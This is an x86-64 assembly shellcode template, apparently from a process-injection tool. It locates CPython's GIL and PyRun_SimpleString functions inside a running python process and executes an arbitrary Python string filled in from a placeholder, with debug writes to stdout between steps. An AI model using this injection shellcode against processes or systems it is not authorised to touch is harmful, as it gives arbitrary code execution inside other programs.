	# // BEGIN: call Py_Initialize()
	# push r14
	# mov rbx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:Py_Initialize:RELATIVEOFFSET]
	# pop r14
	# // END: call Py_Initialize()
	
	// copy the Python string to arbitrary read/write memory
	push r14
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 32
	lea rsi, python_code[rip]
	mov rcx, [VARIABLE:pythoncode.length:VARIABLE]
	add rcx, 2												# null terminator
	rep movsb
	pop r14
	// END: copy the Python string to arbitrary read/write memory
	
	//debug
	push r14
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 1 #from buffer
	syscall
	pop r14
	///debug

	// BEGIN: call PyGILState_Ensure() and store the handle it returns
	push rbx
	xor rax, rax
	mov rdi, 0
	mov rsi, 0
	mov rbx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:PyGILState_Ensure:RELATIVEOFFSET]
	call rbx
	mov rbx, arbitrary_read_write_data_address[rip]
	mov [rbx], rax
	pop rbx
	// END: call PyGILState_Ensure()
	
	//debug
	push r14
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 2 #from buffer
	syscall
	pop r14
	///debug

	// BEGIN: call PyRun_SimpleString("arbitrary Python code here")
	//push rbx
	mov rsi, 0
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 32
	sub rsp, 8
	mov [rsp], rdi
	mov rbx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:PyRun_SimpleStringFlags:RELATIVEOFFSET]
	call rbx
	//pop rbx
	// END: call PyRun_SimpleString("arbitrary Python code here")
	
	//debug
	push r14
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 3 #from buffer
	syscall
	pop r14
	///debug
	
	// BEGIN: call PyGILState_Release(handle)
	push rbx
	mov rbx, arbitrary_read_write_data_address[rip]
	mov rax, [rbx]
	mov rdi, rax
	mov rbx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:PyGILState_Release:RELATIVEOFFSET]
	call rbx
	pop rbx
	// END: call PyGILState_Release(handle)
	
	//debug
	push r14
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 4 #from buffer
	syscall
	pop r14
	///debug
	
	# // BEGIN: call Py_Finalize()
	# push rbx
	# mov rax, 0
	# mov rdi, rax
	# mov rbx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:Py_Finalize:RELATIVEOFFSET]
	# call rbx
	# pop rbx
	# // END: call Py_Finalize()

	//debug
	push r14
	push r13
	push r11
	mov rax,1 # write to file
	mov rdi,1 # stdout
	mov rdx,1 # number of bytes
	lea rsi, dmsg[rip] + 5 #from buffer
	syscall
	pop r11
	pop r13
	pop r14
	///debug
	
	

BEGIN_SHELLCODE_DATA

python_code:
	.ascii "[VARIABLE:pythoncode:VARIABLE]\0"

dmsg:
	.ascii "ZYXWVUTSRQPONMLKJIHG\0"
